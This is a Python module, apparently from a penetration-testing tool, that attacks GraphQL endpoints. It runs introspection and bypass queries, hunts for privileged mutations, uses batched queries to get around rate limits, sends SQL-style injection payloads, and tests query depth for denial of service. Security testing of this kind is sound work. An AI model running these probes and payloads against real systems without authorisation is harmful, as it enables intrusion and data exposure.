"""GraphQL module — introspection, batching attacks, field brute-force, injection."""

from __future__ import annotations

from typing import Any, Dict, List

from sentinel.models import AttackResult, EngagementSession
from sentinel.logger import log
from sentinel.modules.base import BaseModule
from sentinel.utils.http import request
from sentinel.data import GRAPHQL_INTROSPECTION, GRAPHQL_INTROSPECTION_BYPASS


class GraphQLModule(BaseModule):
    """GraphQL introspection, batching attacks, field brute-force, injection."""

    name = "graphql"

    def run(self, es: EngagementSession, **kwargs: object) -> List[AttackResult]:
        graphql_url: str = kwargs.get("graphql_url", "")  # type: ignore[assignment]

        results: List[AttackResult] = []
        gql_url = graphql_url or (es.loot.get("fingerprint", {}).get("graphql_url") or
                                   es.base_url.rstrip("/") + "/graphql")

        if not gql_url:
            # Try to find GraphQL endpoint
            for path in ["/graphql", "/api/graphql", "/graphiql", "/query"]:
                url = es.base_url.rstrip("/") + path
                resp = request(es, "POST", url, json={"query": "{__typename}"})
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                        if "__typename" in str(data):
                            gql_url = url
                            log(f"[GraphQL] Endpoint found: {gql_url}", "OK")
                            break
                    except Exception:
                        pass
            if not gql_url:
                return [AttackResult("graphql", "discovery", "NOT_VULN",
                                     notes="No GraphQL endpoint found")]

        log(f"[GraphQL] Attacking: {gql_url}", "INFO")

        # 1. Introspection (disabled = good security practice, enabled = info leak)
        introspection_enabled = False
        resp = request(es, "POST", gql_url, json={"query": GRAPHQL_INTROSPECTION})
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                if data.get("data", {}).get("__schema"):
                    introspection_enabled = True
                    schema = data["data"]["__schema"]
                    types = schema.get("types", [])
                    user_types = [t["name"] for t in types if t.get("name") and
                                  not t["name"].startswith("__")]
                    mutations = []
                    if schema.get("mutationType"):
                        mut_name = schema["mutationType"]["name"]
                        for t in types:
                            if t["name"] == mut_name:
                                mutations = [f["name"] for f in (t.get("fields") or [])]
                    log(f"[GraphQL] Introspection ENABLED! Types: {len(user_types)}, Mutations: {len(mutations)}", "CRIT")
                    results.append(AttackResult(
                        "graphql", "introspection", "VULN",
                        url=gql_url,
                        evidence=f"Types: {user_types[:10]} | Mutations: {mutations[:10]}",
                        data={"types": user_types, "mutations": mutations},
                        severity="MEDIUM",
                        notes="GraphQL introspection enabled — full schema exposed to attackers",
                    ))
                    es.loot["graphql_schema"] = {"types": user_types, "mutations": mutations}

                    # Try sensitive mutations
                    for mutation_name in mutations:
                        if any(kw in mutation_name.lower() for kw in
                               ["delete", "admin", "password", "role", "permission", "create_user",
                                "updateRole", "resetPassword", "grantAccess"]):
                            log(f"[GraphQL] High-value mutation: {mutation_name}", "WARN")
                    if user_types:
                        results.append(AttackResult(
                            "graphql", "sensitive_mutations", "PARTIAL",
                            url=gql_url,
                            evidence=str([m for m in mutations if any(
                                kw in m.lower() for kw in ["delete", "admin", "password", "role"])]),
                            severity="HIGH",
                            notes="Review mutations manually for privilege escalation vectors",
                        ))
            except Exception:
                pass

        # 2. Introspection bypass attempts
        if not introspection_enabled:
            for bypass_query in GRAPHQL_INTROSPECTION_BYPASS:
                resp = request(es, "POST", gql_url, json={"query": bypass_query})
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                        if "data" in data and data["data"]:
                            results.append(AttackResult(
                                "graphql", "introspection_bypass", "VULN",
                                url=gql_url, payload=bypass_query,
                                evidence=str(data)[:200], severity="MEDIUM",
                                notes="Introspection disabled but bypass query returned schema info",
                            ))
                    except Exception:
                        pass

        # 3. Batching attack (rate limit bypass)
        batch_query = [{"query": f'{{ user(id: {i}) {{ id email role }} }}'} for i in range(1, 20)]
        resp = request(es, "POST", gql_url, json=batch_query)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                if isinstance(data, list) and len(data) > 1:
                    log(f"[GraphQL] BATCHING enabled — rate limit bypass possible!", "CRIT")
                    results.append(AttackResult(
                        "graphql", "batching_attack", "VULN",
                        url=gql_url,
                        evidence=f"Batch of {len(data)} queries accepted in single request",
                        severity="HIGH",
                        notes="GraphQL batching enabled — brute-force/rate-limit bypass possible via batch queries",
                    ))
            except Exception:
                pass

        # 4. GraphQL injection (using known types from introspection)
        gql_inject_payloads = [
            '{ user(id: "1\\" OR 1=1--") { id email } }',
            '{ user(id: 1, ) { id __typename } }',  # parser confusion
            '{ __typename @skip(if: false) }',
        ]
        for inj in gql_inject_payloads:
            resp = request(es, "POST", gql_url, json={"query": inj})
            if resp and resp.status_code == 200:
                body = resp.text
                if any(e in body.lower() for e in ["sql", "exception", "error", "stack"]):
                    results.append(AttackResult(
                        "graphql", "gql_injection", "VULN",
                        url=gql_url, payload=inj, evidence=body[:200],
                        severity="HIGH",
                        notes="Potential injection via GraphQL query arguments",
                    ))

        # 5. Depth/complexity DoS potential
        deep_query = "{ a { b { c { d { e { f { __typename } } } } } } }"
        resp = request(es, "POST", gql_url, json={"query": deep_query})
        if resp and resp.status_code == 200 and resp.elapsed.total_seconds() > 2.0:
            results.append(AttackResult(
                "graphql", "query_depth", "VULN",
                url=gql_url,
                evidence=f"Deep query took {resp.elapsed.total_seconds():.1f}s",
                severity="LOW",
                notes="No query depth limit — deeply nested queries may cause DoS",
            ))

        if not results:
            results.append(AttackResult("graphql", "scan", "NOT_VULN",
                                        url=gql_url, notes="No GraphQL vulnerabilities found"))
        return results
